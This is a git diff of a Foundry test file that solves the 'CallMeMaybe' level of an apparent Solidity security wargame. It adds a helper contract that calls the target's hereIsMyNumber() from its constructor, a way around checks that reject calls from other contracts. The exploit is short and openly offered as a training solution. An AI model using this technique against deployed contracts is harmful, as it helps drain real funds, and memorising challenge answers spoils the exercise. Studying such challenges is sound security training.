@@ -2,7 +2,15 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/05_CallMeMaybe/CallMeMaybe.sol";
+import "../src/05_CallMeMaybe/CallMeMaybe.sol";
+
+contract Cushion is BaseTest {
+    constructor(CallMeMaybe instance) {
+        
+        //assertEq(msg.sender, tx.origin);
+        instance.hereIsMyNumber();
+    }
+}
 
 // forge test --match-contract CallMeMaybeTest -vvvv
 contract CallMeMaybeTest is BaseTest {
@@ -15,7 +23,8 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Cushion cushion = new Cushion(instance);
+        //cushion.testExploitLevel();
 
         checkSuccess();
     }
